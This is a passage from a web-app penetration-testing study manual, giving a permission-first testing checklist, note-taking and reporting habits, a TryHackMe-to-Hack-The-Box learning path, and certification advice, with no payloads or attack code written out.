- [ ] Confirm scope: you have written permission and know exactly what's in and out of bounds.
- [ ] Set up: start Burp/ZAP as proxy, open your notes file, define the target, confirm your wordlists are installed and `rockyou.txt` is extracted.
- [ ] Recon: fingerprint stack, enumerate subdomains, scan ports, discover content (phase 1).
- [ ] Map the app: every page, input, parameter, role, and multi-step flow.
- [ ] Config review: scan for misconfigs, exposed files, missing headers (phase 2).
- [ ] Auth & identity: test login, registration, reset, enumeration (phases 3–4).
- [ ] Access control: test IDOR and privilege escalation on every object and action (phase 5).
- [ ] Sessions: inspect cookies, flags, expiry, CSRF (phase 6).
- [ ] Input validation: inject into every input — SQLi, XSS, command, SSTI, traversal, SSRF (phase 7).
- [ ] Errors & crypto: trigger errors, audit TLS (phase 8).
- [ ] Business logic: abuse workflows, quantities, sequences, limits (phase 9).
- [ ] Client-side: review JS, storage, redirects, CORS (phase 10).
- [ ] Write it up: each finding with evidence, impact, and a fix.

**Note-taking habits that make you faster:**

- Keep one running notes file per target (Markdown, CherryTree, or Obsidian).
- For every finding record: the request, the exact steps to reproduce, a screenshot, the impact, and a remediation.
- Save interesting requests to Burp's site map / Repeater tabs so you can replay them.
- Write findings as you go, not at the end — you'll forget the reproduction steps otherwise.

**A finding, structured:** title → severity → affected endpoint → steps to reproduce → proof → impact → recommended fix. This is also exactly how a professional report and a bug-bounty submission are structured, so the habit pays off immediately.

---

## A beginner learning path (TryHackMe → beyond)

If you're starting from near-zero, learning the fundamentals on **TryHackMe** is a legitimate, common way in — guided rooms, a safe legal lab, and a structured order so you're not guessing what to learn next. Follow the paths rather than random rooms:

1. **Pre Security** — the groundwork: how networks work, the OSI model, basic Linux, how the web works. Do this if terms like TCP or "HTTP request" are fuzzy.
2. **Complete Beginner** (or **Cyber Security 101**) — your real starting line: Linux commands, the core tools (nmap, Burp, gobuster), and your first simple machines.
3. **Jr Penetration Tester** — where it gets real: proper enumeration, web app attacks (this is where *this manual* starts to click), and privilege escalation.

**Then graduate off the training wheels** — guided rooms tell you what the bug is; real targets don't, and finding a bug nobody pointed you to is the hardest, most important skill. Progress to less-guided practice:

4. **PortSwigger Web Security Academy** — free, and the best web-app training anywhere; maps almost 1:1 to this manual's phases.
5. **OWASP Juice Shop** — apply it with no hand-holding at all.
6. **Hack The Box** / harder THM rooms — unguided full machines.
7. **Bug-bounty writeups** (HackerOne, public disclosures) — see how real bugs are found and chained.

**How to actually learn from a guided room (not just collect completions):**

- **Type every command yourself** instead of pasting — your hands learn the tools.
- When a room says "run this," run it and *read the output until you understand what it told you*, then answer.
- Keep a notes file per room: open ports, versions, creds, what worked — in your own words.
- **When stuck, read one hint, not the full walkthrough.** Ten minutes of struggle teaches more than any walkthrough. Save walkthroughs for *after* you finish, to see what you missed.
- Avoid leaning on Metasploit at first — do it manually so you understand *why* it works.
- One room a day beats a weekend binge — same daily-reps logic as the rest of this manual.

The honest version: a platform is a *start*, not the whole journey. People get good by practising until they understand why each attack works, then going somewhere with less guidance and struggling through it.

---

## Keep learning fast

- **Practice daily, in small reps.** One PortSwigger lab or one Juice Shop challenge a day beats a weekend cram. Consistency builds the pattern-recognition that makes you fast.
- **Follow the WSTG as your syllabus.** Each test in the guide is a skill to tick off. Work through them against your lab apps.
- **Learn to script.** Once a technique is manual-mapped, automate it with a little Python or Bash. Understanding *why* a tool works beats memorizing flags.
- **Certification path, roughly in order:** CompTIA Security+ (foundations) → eJPT (hands-on entry) → PNPT or OSCP (serious practical pentesting). Pick based on your goal — none is required to start learning.
- **Read other people's work.** Public bug-bounty writeups and HackerOne reports show how real bugs are found and chained.
- **Grow this manual.** Every time you learn a new tool, payload, wordlist, or trick, add it to the matching section. A manual you maintain is worth ten you downloaded.

Start tonight: install Juice Shop with Docker, point Burp at it, extract rockyou, install SecLists, and run phase 1. You'll hit your first finding faster than you'd expect.
